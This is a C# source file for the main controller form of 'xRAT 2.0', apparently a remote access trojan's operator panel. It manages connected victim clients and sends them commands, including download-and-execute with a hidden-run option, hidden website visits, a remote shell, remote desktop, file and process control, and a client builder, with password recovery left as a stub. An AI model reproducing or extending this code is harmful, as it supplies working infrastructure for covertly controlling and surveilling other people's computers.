using System;
using System.Threading;
using System.Windows.Forms;
using Core;
using Core.Commands;
using Core.Packets;
using xRAT_2.Settings;

namespace xRAT_2.Forms
{
    public partial class frmMain : Form
    {
        public Server listenServer;
        private ListViewColumnSorter lvwColumnSorter;

        public frmMain()
        {
            XMLSettings.WriteDefaultSettings();

            XMLSettings.ListenPort = ushort.Parse(XMLSettings.ReadValue("ListenPort"));
            XMLSettings.AutoListen = bool.Parse(XMLSettings.ReadValue("AutoListen"));
            XMLSettings.ShowPopup = bool.Parse(XMLSettings.ReadValue("ShowPopup"));
            XMLSettings.Password = XMLSettings.ReadValue("Password");

            if (bool.Parse(XMLSettings.ReadValue("ShowToU")))
            {
                new frmTermsOfUse().ShowDialog();
                Thread.Sleep(300);
            }

            InitializeComponent();

            this.Menu = mainMenu;

            lvwColumnSorter = new ListViewColumnSorter();
            lstClients.ListViewItemSorter = lvwColumnSorter;

            ListViewExtensions.removeDots(lstClients);
            ListViewExtensions.changeTheme(lstClients);
        }

        public void updateWindowTitle(int count, int selected)
        {
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
#if DEBUG
                    if (selected > 0)
                        this.Text = string.Format("xRAT 2.0 - Connected: {0} [Selected: {1}] - Threads: {2}", count, selected, System.Diagnostics.Process.GetCurrentProcess().Threads.Count);
                    else
                        this.Text = string.Format("xRAT 2.0 - Connected: {0} - Threads: {1}", count, System.Diagnostics.Process.GetCurrentProcess().Threads.Count);
#else
                    if (selected > 0)
                        this.Text = string.Format("xRAT 2.0 - Connected: {0} [Selected: {1}]", count, selected);
                    else
                        this.Text = string.Format("xRAT 2.0 - Connected: {0}", count);
#endif
                });
            }
            catch
            { }
        }

        private void frmMain_Load(object sender, EventArgs e)
        {
            listenServer = new Server(8192);

            listenServer.AddTypesToSerializer(typeof(IPacket), new Type[]
            {
                typeof(Core.Packets.ServerPackets.InitializeCommand),
                typeof(Core.Packets.ServerPackets.Disconnect),
                typeof(Core.Packets.ServerPackets.Reconnect),
                typeof(Core.Packets.ServerPackets.Uninstall),
                typeof(Core.Packets.ServerPackets.DownloadAndExecute),
                typeof(Core.Packets.ServerPackets.Desktop),
                typeof(Core.Packets.ServerPackets.GetProcesses),
                typeof(Core.Packets.ServerPackets.KillProcess),
                typeof(Core.Packets.ServerPackets.StartProcess),
                typeof(Core.Packets.ServerPackets.Drives),
                typeof(Core.Packets.ServerPackets.Directory),
                typeof(Core.Packets.ServerPackets.DownloadFile),
                typeof(Core.Packets.ServerPackets.MouseClick),
                typeof(Core.Packets.ServerPackets.GetSystemInfo),
                typeof(Core.Packets.ServerPackets.VisitWebsite),
                typeof(Core.Packets.ServerPackets.ShowMessageBox),
                typeof(Core.Packets.ServerPackets.Update),
                typeof(Core.Packets.ServerPackets.Monitors),
                typeof(Core.Packets.ServerPackets.ShellCommand),
                typeof(Core.Packets.ServerPackets.Rename),
                typeof(Core.Packets.ServerPackets.Delete),
                typeof(Core.Packets.ClientPackets.Initialize),
                typeof(Core.Packets.ClientPackets.Status),
                typeof(Core.Packets.ClientPackets.UserStatus),
                typeof(Core.Packets.ClientPackets.DesktopResponse),
                typeof(Core.Packets.ClientPackets.GetProcessesResponse),
                typeof(Core.Packets.ClientPackets.DrivesResponse),
                typeof(Core.Packets.ClientPackets.DirectoryResponse),
                typeof(Core.Packets.ClientPackets.DownloadFileResponse),
                typeof(Core.Packets.ClientPackets.GetSystemInfoResponse),
                typeof(Core.Packets.ClientPackets.MonitorsResponse),
                typeof(Core.Packets.ClientPackets.ShellCommandResponse)
            });

            listenServer.ServerState += serverState;
            listenServer.ClientState += clientState;
            listenServer.ClientRead += clientRead;

            if (XMLSettings.AutoListen)
                listenServer.Listen(XMLSettings.ListenPort);
        }

        private void frmMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (listenServer.Listening)
                listenServer.Disconnect();

            nIcon.Visible = false;
        }

        private void lstClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            updateWindowTitle(listenServer.ConnectedClients, lstClients.SelectedItems.Count);
        }

        private void serverState(Server server, bool listening)
        {
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    botListen.Text = "Listening: " + listening.ToString();
                });
            }
            catch
            { }
        }

        private void clientState(Server server, Client client, bool connected)
        {
            if (connected)
            {
                client.Value = new UserState(); // Initialize the UserState so we can store values in there if we need to.

                new Core.Packets.ServerPackets.InitializeCommand().Execute(client);
            }
            else
            {
                foreach (ListViewItem lvi in lstClients.Items)
                    if ((Client)lvi.Tag == client)
                    {
                        lvi.Remove();
                        server.ConnectedClients--;
                    }
                updateWindowTitle(listenServer.ConnectedClients, lstClients.SelectedItems.Count);
            }
        }

        private void clientRead(Server server, Client client, IPacket packet)
        {
            Type type = packet.GetType();

            if (!client.Value.isAuthenticated)
            {
                if (type == typeof(Core.Packets.ClientPackets.Initialize))
                    CommandHandler.HandleInitialize(client, (Core.Packets.ClientPackets.Initialize)packet, this);
                else
                    return;
            }

            if (type == typeof(Core.Packets.ClientPackets.Status))
            {
                CommandHandler.HandleStatus(client, (Core.Packets.ClientPackets.Status)packet, this);
            }
            else if (type == typeof(Core.Packets.ClientPackets.UserStatus))
            {
                CommandHandler.HandleUserStatus(client, (Core.Packets.ClientPackets.UserStatus)packet, this);
            }
            else if (type == typeof(Core.Packets.ClientPackets.DesktopResponse))
            {
                CommandHandler.HandleRemoteDesktopResponse(client, (Core.Packets.ClientPackets.DesktopResponse)packet);
            }
            else if (type == typeof(Core.Packets.ClientPackets.GetProcessesResponse))
            {
                CommandHandler.HandleGetProcessesResponse(client, (Core.Packets.ClientPackets.GetProcessesResponse)packet);
            }
            else if (type == typeof(Core.Packets.ClientPackets.DrivesResponse))
            {
                CommandHandler.HandleDrivesResponse(client, (Core.Packets.ClientPackets.DrivesResponse)packet);
            }
            else if (type == typeof(Core.Packets.ClientPackets.DirectoryResponse))
            {
                CommandHandler.HandleDirectoryResponse(client, (Core.Packets.ClientPackets.DirectoryResponse)packet);
            }
            else if (type == typeof(Core.Packets.ClientPackets.DownloadFileResponse))
            {
                CommandHandler.HandleDownloadFileResponse(client, (Core.Packets.ClientPackets.DownloadFileResponse)packet);
            }
            else if (type == typeof(Core.Packets.ClientPackets.GetSystemInfoResponse))
            {
                CommandHandler.HandleGetSystemInfoResponse(client, (Core.Packets.ClientPackets.GetSystemInfoResponse)packet);
            }
            else if (type == typeof(Core.Packets.ClientPackets.MonitorsResponse))
            {
                CommandHandler.HandleMonitorsResponse(client, (Core.Packets.ClientPackets.MonitorsResponse)packet);
            }
            else if (type == typeof(Core.Packets.ClientPackets.ShellCommandResponse))
            {
                CommandHandler.HandleShellCommandResponse(client, (Core.Packets.ClientPackets.ShellCommandResponse)packet);
            }
        }

        private void lstClients_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            // Determine if clicked column is already the column that is being sorted.
            if (e.Column == lvwColumnSorter.SortColumn)
            {
                // Reverse the current sort direction for this column.
                if (lvwColumnSorter.Order == SortOrder.Ascending)
                    lvwColumnSorter.Order = SortOrder.Descending;
                else
                    lvwColumnSorter.Order = SortOrder.Ascending;
            }
            else
            {
                // Set the column number that is to be sorted; default to ascending.
                lvwColumnSorter.SortColumn = e.Column;
                lvwColumnSorter.Order = SortOrder.Ascending;
            }

            // Perform the sort with these new sort options.
            lstClients.Sort();
        }

        #region "ContextMenu"
            #region "Connection"
            private void ctxtUpdate_Click(object sender, EventArgs e)
            {
                if (lstClients.SelectedItems.Count != 0)
                {
                    frmUpdate frmU = new frmUpdate(lstClients.SelectedItems.Count);
                    if (frmU.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                    {
                        foreach (ListViewItem lvi in lstClients.SelectedItems)
                        {
                            Client c = (Client)lvi.Tag;
                            new Core.Packets.ServerPackets.Update(_Update.DownloadURL).Execute(c);
                        }
                    }
                }
            }

            private void ctxtDisconnect_Click(object sender, EventArgs e)
            {
                foreach (ListViewItem lvi in lstClients.SelectedItems)
                {
                    Client c = (Client)lvi.Tag;
                    new Core.Packets.ServerPackets.Disconnect().Execute(c);
                }
            }

            private void ctxtReconnect_Click(object sender, EventArgs e)
            {
                foreach (ListViewItem lvi in lstClients.SelectedItems)
                {
                    Client c = (Client)lvi.Tag;
                    new Core.Packets.ServerPackets.Reconnect().Execute(c);
                }
            }

            private void ctxtUninstall_Click(object sender, EventArgs e)
            {
                if (MessageBox.Show(string.Format("Are you sure you want to uninstall the client on {0} computer\\s?\nThe clients won't come back!", lstClients.SelectedItems.Count), "Uninstall Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == System.Windows.Forms.DialogResult.Yes)
                {
                    foreach (ListViewItem lvi in lstClients.SelectedItems)
                    {
                        Client c = (Client)lvi.Tag;
                        new Core.Packets.ServerPackets.Uninstall().Execute(c);
                    }
                }
            }
            #endregion
            
            #region "System"
            private void ctxtSystemInformation_Click(object sender, EventArgs e)
            {
                if (lstClients.SelectedItems.Count != 0)
                {
                    Client c = (Client)lstClients.SelectedItems[0].Tag;
                    if (c.Value.frmSI != null)
                    {
                        c.Value.frmSI.Focus();
                        return;
                    }
                    frmSystemInformation frmSI = new frmSystemInformation(c);
                    frmSI.Show();
                }
            }
            
            private void ctxtDownloadAndExecute_Click(object sender, EventArgs e)
            {
                if (lstClients.SelectedItems.Count != 0)
                {
                    frmDownloadAndExecute frmDaE = new frmDownloadAndExecute(lstClients.SelectedItems.Count);
                    if (frmDaE.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                    {
                        foreach (ListViewItem lvi in lstClients.SelectedItems)
                        {
                            Client c = (Client)lvi.Tag;
                            new Core.Packets.ServerPackets.DownloadAndExecute(DownloadAndExecute.URL, DownloadAndExecute.RunHidden).Execute(c);
                        }
                    }
                }
            }
            
            private void ctxtTaskManager_Click(object sender, EventArgs e)
            {
                if (lstClients.SelectedItems.Count != 0)
                {
                    Client c = (Client)lstClients.SelectedItems[0].Tag;
                    if (c.Value.frmTM != null)
                    {
                        c.Value.frmTM.Focus();
                        return;
                    }
                    frmTaskManager frmTM = new frmTaskManager(c);
                    frmTM.Show();
                }
            }
            
            private void ctxtFileManager_Click(object sender, EventArgs e)
            {
                if (lstClients.SelectedItems.Count != 0)
                {
                    Client c = (Client)lstClients.SelectedItems[0].Tag;
                    if (c.Value.frmFM != null)
                    {
                        c.Value.frmFM.Focus();
                        return;
                    }
                    frmFileManager frmFM = new frmFileManager(c);
                    frmFM.Show();
                }
            }
            
            private void ctxtPasswordRecovery_Click(object sender, EventArgs e)
            {
                if (lstClients.SelectedItems.Count != 0)
                {
                    // TODO
                }
            }
            
            private void ctxtRemoteShell_Click(object sender, EventArgs e)
            {
                if (lstClients.SelectedItems.Count != 0)
                {
                    Client c = (Client)lstClients.SelectedItems[0].Tag;
                    if (c.Value.frmRS != null)
                    {
                        c.Value.frmRS.Focus();
                        return;
                    }
                    frmRemoteShell frmRS = new frmRemoteShell(c);
                    frmRS.Show();
                }
            }
            #endregion
            
            #region "Surveillance"
            private void ctxtRemoteDesktop_Click(object sender, EventArgs e)
            {
                if (lstClients.SelectedItems.Count != 0)
                {
                    Client c = (Client)lstClients.SelectedItems[0].Tag;
                    if (c.Value.frmRDP != null)
                    {
                        c.Value.frmRDP.Focus();
                        return;
                    }
                    frmRemoteDesktop frmRDP = new frmRemoteDesktop(c);
                    frmRDP.Show();
                }
            }
            #endregion
            
            #region "Miscellaneous"
            private void ctxtVisitWebsite_Click(object sender, EventArgs e)
            {
                if (lstClients.SelectedItems.Count != 0)
                {
                    frmVisitWebsite frmVW = new frmVisitWebsite(lstClients.SelectedItems.Count);
                    if (frmVW.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                    {
                        foreach (ListViewItem lvi in lstClients.SelectedItems)
                        {
                            Client c = (Client)lvi.Tag;
                            new Core.Packets.ServerPackets.VisitWebsite(VisitWebsite.URL, VisitWebsite.Hidden).Execute(c);
                        }
                    }
                }
            }
            
            private void ctxtShowMessagebox_Click(object sender, EventArgs e)
            {
                if (lstClients.SelectedItems.Count != 0)
                {
                    Client c = (Client)lstClients.SelectedItems[0].Tag;
                    if (c.Value.frmSM != null)
                    {
                        c.Value.frmSM.Focus();
                        return;
                    }
                    frmShowMessagebox frmSM = new frmShowMessagebox(c);
                    frmSM.Show();
                }
            }
            #endregion
        #endregion

        #region "MenuStrip"
        private void menuClose_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void menuSettings_Click(object sender, EventArgs e)
        {
            new frmSettings(listenServer).ShowDialog();
        }

        private void menuBuilder_Click(object sender, EventArgs e)
        {
            new frmBuilder().ShowDialog();
        }

        private void menuStatistics_Click(object sender, EventArgs e)
        {
            if (listenServer.BytesReceived == 0 || listenServer.BytesSent == 0)
                MessageBox.Show("Please wait for at least one connected Client!", "xRAT 2.0", MessageBoxButtons.OK, MessageBoxIcon.Information);
            else
                new frmStatistics(listenServer.BytesReceived, listenServer.BytesSent, listenServer.ConnectedClients, listenServer.AllTimeConnectedClients).ShowDialog();
        }

        private void menuAbout_Click(object sender, EventArgs e)
        {
            new frmAbout().ShowDialog();
        }
        #endregion

        #region "NotifyIcon"
        private void nIcon_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            this.WindowState = (this.WindowState == FormWindowState.Normal) ? FormWindowState.Minimized : FormWindowState.Normal;
            this.ShowInTaskbar = (this.WindowState == FormWindowState.Normal);
        }
        #endregion
    }
}
